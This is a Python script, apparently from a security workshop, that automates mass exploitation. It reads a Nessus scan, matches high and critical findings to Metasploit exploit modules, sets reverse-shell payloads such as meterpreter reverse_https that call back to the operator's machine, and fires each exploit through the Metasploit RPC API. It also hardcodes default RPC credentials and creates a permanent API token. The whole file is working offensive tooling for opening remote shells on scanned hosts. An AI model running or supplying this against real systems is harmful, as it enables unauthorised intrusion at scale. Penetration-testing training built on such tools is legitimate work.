#!/usr/bin/env python3

import re
import sys
import argparse
import netifaces
import time
from IPython import embed
from lib.msfrpc import Msfrpc
from libnessus.parser import NessusParser
from netaddr import IPNetwork, AddrFormatError

def parse_args():
    '''
    Parse arguments
    '''
    parser = argparse.ArgumentParser()
    parser.add_argument("-n", "--nessus", help="Nessus .nessus file", required=True)
    parser.add_argument("-u", "--user", default='msf', help="Username for msfrpc")
    parser.add_argument("-p", "--password", default='123', help="Password for msfrpc")
    return parser.parse_args()


def parse_nessus():
    '''
    Parse .nessus file
    '''
    report = NessusParser.parse_fromfile(args.nessus)
    return report


def get_nes_exploits(report):
    '''
    Read .nessus file for vulnerabilities that Metasploit can exploit
    '''
    # This will eventually be: exploits = [(msf_mod, ip, port, operating_sys), (msf_mod, ip, port, operating_sys)]
    exploits = []

    for host in report.hosts:
        os_type = get_os_type(host)
        
        if not os_type:
            continue

        report_items = host.get_report_items
        for x in report_items:
            vuln_info = x.get_vuln_info
            severity = x.severity
            # Make sure we're just getting highs and criticals
            if int(severity) > 2:
                exploit_data = get_exploit_data(host, vuln_info, severity, os_type)
                if exploit_data:
                    exploits.append(exploit_data)

    if len(exploits) > 0:
        return exploits
    else:
        sys.exit('[-] No vulnerable hosts found')


def get_os_type(host):
    '''
    Converts Nessus operating system info to MSF exploit path label
    '''
    if 'operating-system' in host.get_host_properties:
        os_type = host.get_host_properties['operating-system']
        if 'windows' in os_type.lower():
            os_type = 'windows'
        elif 'linux' in os_type.lower():
            os_type = 'linux'
        elif 'solaris' in os_type.lower():
            os_type = 'solaris'
        elif 'android' in os_type.lower():
            os_type = 'android'
        elif 'unix' in os_type.lower():
            os_type = 'unix'
        elif 'osx' in os_type.lower():
            os_type = 'osx'

        return os_type

    else:
        return


def get_exploit_data(host, vuln_info, severity, operating_sys):
    '''
    Gather the exploitable vulnerability info
    '''
    if 'metasploit_name' in vuln_info:
        # Get module name, IP and port
        ip = host.address
        port = vuln_info['port']
        msf_mod = vuln_info['metasploit_name']
        exploit_data = (msf_mod, ip, port, operating_sys)

        return exploit_data


def get_msfrpc_client():
    '''
    Connect to MSF RPC API with permanent token
    '''
    client = Msfrpc({})
    client.login(args.user, args.password)
    client.call('auth.token_add', ['hexacon']) # create permanent API token
    client.token = 'hexacon'

    return client


def get_console_id(client):
    '''
    Get or create a metasploit console for running commands
    '''
    c_ids = [x[b'id'] for x in client.call('console.list')[b'consoles']]

    if len(c_ids) == 0:
        client.call('console.create')
        c_ids = [x[b'id'] for x in client.call('console.list')[b'consoles']] # Wait for response
        time.sleep(2)

    # Get the latest console
    c_id = c_ids[-1].decode('utf8')

    # Clear console output
    client.call('console.read', [c_id])[b'data'].decode('utf8').splitlines()

    return c_id


########################### NEW CODE BELOW ############################


def run_nessus_exploits(client, c_id, nes_exploits):
    '''
    Matches metasploit module description from Nessus output to the
    actual module path. Doesn't do aux (so no DOS), just exploits
    '''
    local_ip = get_local_ip(get_iface())
    msf_exploits = get_all_exploits(client, c_id)

    for mod_data in nes_exploits:
        mod_desc = mod_data[0]
        ip = mod_data[1]
        port = mod_data[2]
        os_type = mod_data[3]
        path = get_msf_path(msf_exploits, mod_desc, os_type)
        if not path:
            continue
        print('[+] Found vulnerable host! {}:{} - {}'.format(ip, port, path))####

        module_output = run_msf_module(client, c_id, local_ip, ip, path, port, os_type)

        if module_output:
            print('[*] {} output:'.format(path))
            for l in module_output:
                print('    '+l)
            print('')

def get_iface():
    '''
    Grabs an interface so we can grab the IP off that interface
    '''
    try:
        iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
    except:
        ifaces = []
        for iface in netifaces.interfaces():
            # list of ipv4 addrinfo dicts
            ipv4s = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])

            for entry in ipv4s:
                addr = entry.get('addr')
                if not addr:
                    continue
                if not (iface.startswith('lo') or addr.startswith('127.')):
                    ifaces.append(iface)

        # Just get the first interface
        iface = ifaces[0]

    return iface


def get_local_ip(iface):
    '''
    Gets the the local IP of an interface
    '''
    ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
    return ip


def get_all_exploits(client, c_id):
    '''
    Gets all exploit modules from MSF
    '''
    all_exploits = []
    print("[*] Collecting list of all Metasploit modules...")

    cmd = "search exploit/"
    output = run_console_cmd(client, c_id, cmd)
    for l in output:
        # Filter out nonexploits
        if 'exploit/' in l:
            all_exploits.append(l)

    return all_exploits


def run_console_cmd(client, c_id, cmd):
    '''
    Runs module and gets output
    '''
    cmd = cmd + '\n'

    print('[*] Running MSF command:')
    for l in cmd.splitlines():
        l = l.strip()
        if l != '':
            print('    {}'.format(l))
    print('')

    client.call('console.write',[c_id, cmd])
    time.sleep(3)
    mod_output = get_console_output(client, c_id)

    return mod_output


def get_msf_path(msf_exploits, mod_desc, os_type):
    '''
    Converts Nessus' module desc to MSF module path
    '''
    for x in msf_exploits:
        x_split = x.split(None, 3)
        if len(x_split) == 4:
            path = x_split[0]
            date = x_split[1]
            rank = x_split[2]
            msf_desc = x_split[3]
            if mod_desc.lower() in msf_desc.lower():
                if 'exploit/' in path:
                    if '/local/' not in path and '/fileformat/' not in path:
                        return path


def run_msf_module(client, c_id, local_ip, ip, mod_path, port, os_type):
    '''
    Run a Metasploit module
    '''
    rhost_var = None
    req_opts = get_req_opts(client, c_id, mod_path)

    # Sometimes it's RHOSTS sometimes its RHOST
    for o in req_opts:
        if 'RHOST' in o:
            rhost_var = o
        else:
            rhost_var = 'RHOSTS'

    if not rhost_var:
        print('[-] No RHOST required option for this module meaning it won\'t give us a shell - skipping')
        return

    target_num = get_target(client, c_id, mod_path, os_type)
    payload = get_payload(client, mod_path, os_type, target_num)

    # Set the various options
    cmd = create_msf_cmd(mod_path, rhost_var, ip, port, payload, target_num)
    settings_out = run_console_cmd(client, c_id, cmd)

    # Run!
    exploit_cmd = 'exploit -z\n'
    mod_out = run_console_cmd(client, c_id, exploit_cmd)

    return mod_out


def get_req_opts(client, c_id, mod_path):
    '''
    Query MSF for required options for a module
    '''
    req_opts = []
    opts = client.call('module.options', [c_id, mod_path])

    for opt_name in opts:
        if b'required' in opts[opt_name]:
            if opts[opt_name][b'required'] == True:
                if b'default' not in opts[opt_name]:
                    req_opts.append(opt_name.decode('utf8'))

    return req_opts


def get_target(client, c_id, mod_path, os_type):
    '''
    Sets the correct target based on OS
    '''
    found = False

    # targets = {'0':'target 0 desc'}
    targets = get_target_num_lines(client, c_id, mod_path)

    # Only one target
    if len(targets) == 1:
        for target_num in targets:
            return target_num

    # Multiple targets
    else:
        for target_num in targets:
            #  Use automatic targeting first if given option
            if 'automatic' in targets[target_num]:
                found = True
                break

            # Use the first target with matching OS type
            elif os_type in targets[target_num]:
                found = True
                break

            # Use Java if neither of the first conditions are met
            elif 'java' in targets[target_num]:
                found = True
                break
    
    # If nothing else worked just set the target to 0
    if not found:
        target_num = '0'

    return target_num


def get_target_num_lines(client, c_id, mod_path):
    '''
    Gets just the lines of output that contain a target number
    '''
    targets = {}
    cmd = 'use {}\nshow targets\n'.format(mod_path)
    raw_targets = run_console_cmd(client, c_id, cmd)

    for l in raw_targets:

        if 'No exploit module selected' in l:
            return
        
        # Parse the lines with actual target numbers
        re_opt_num = re.match('   (\d+)   ', l)
        if re_opt_num:
            l = l.split(None, 1)
            target_num = l[0]
            targets[target_num] = l[1].lower()

    return targets


def create_msf_cmd(mod_path, rhost_var, ip, port, payload, target_num, extra_opts=''):
    '''
    Creates a one-liner MSF command to set all the right options
    You can set arbitrary options that don't get used which is why we autoinclude
    ExitOnSession True and SRVHOST (for JBoss)
    '''
    local_ip = get_local_ip(get_iface())
    print('[*] Setting options on {}'.format(mod_path))
    cmd = """
           set target {}\n
           set {} {}\n
           set RPORT {}\n
           set LHOST {}\n
           set SRVHOST {}\n
           set payload {}\n
           set ExitOnSession True\n
           {}\n
           """.format(target_num, rhost_var, ip, port, local_ip, local_ip, payload, extra_opts)

    return cmd


def get_payload(client, mod_path, os_type, target_num):
    '''
    Automatically get compatible payloads
    '''
    payload = None
    payloads = []
    win_payloads = ['windows/meterpreter/reverse_https',
                    'windows/x64/meterpreter/reverse_https',
                    'java/meterpreter/reverse_https',
                    'java/jsp_shell_reverse_tcp']

    nix_payloads = ['generic/shell_reverse_tcp',
                    'java/meterpreter/reverse_https',
                    'java/jsp_shell_reverse_tcp',
                    'cmd/unix/reverse']

    if target_num:
        payloads_dict = client.call('module.target_compatible_payloads', [mod_path, int(target_num)])
    else:
        payloads_dict = client.call('module.compatible_payloads', [mod_path])

    if b'error' in payloads_dict:
        print('[-] Error getting payload for {}'.format(mod_path))
    else:
        byte_payloads = payloads_dict[b'payloads']
        for p in byte_payloads:
            payloads.append(p.decode('utf8'))

    # Set a preferred payload based on OS
    if 'windows' in os_type:
        for p in win_payloads:
            if p in payloads:
                payload = p

    else:
        for p in nix_payloads:
            if p in payloads:
                payload = p

    # Some error handling/debug info
    if payload == None:
            print('[-] No preferred payload found, first and last comapatible payloads:')
            print('    '+payloads[0])
            print('    '+payloads[-1])
            print('[-] Skipping this exploit')

    return payload


def get_console_output(client, c_id):
    '''
    Gets complete command output from a console
    '''
    output = []
    consoles = [x[b'id'].decode('utf8') for x in client.call('console.list')[b'consoles']]
    list_offset = consoles.index(c_id)

    # Get any initial output
    output += client.call('console.read', [c_id])[b'data'].decode('utf8').splitlines()

    while client.call('console.list')[b'consoles'][list_offset][b'busy'] == True:
        output += client.call('console.read', [c_id])[b'data'].decode('utf8').splitlines()
        time.sleep(1)

    # Get remaining output
    output += client.call('console.read', [c_id])[b'data'].decode('utf8').splitlines()

    return output

#################################### END NEW CODE #########################################

def main():
    report = parse_nessus()
    nes_exploits = get_nes_exploits(report)
    client = get_msfrpc_client()
    console_id = get_console_id(client)
    run_nessus_exploits(client, console_id, nes_exploits)

if __name__ == '__main__':
    args = parse_args() # This makes the 'args' variable global
    main()
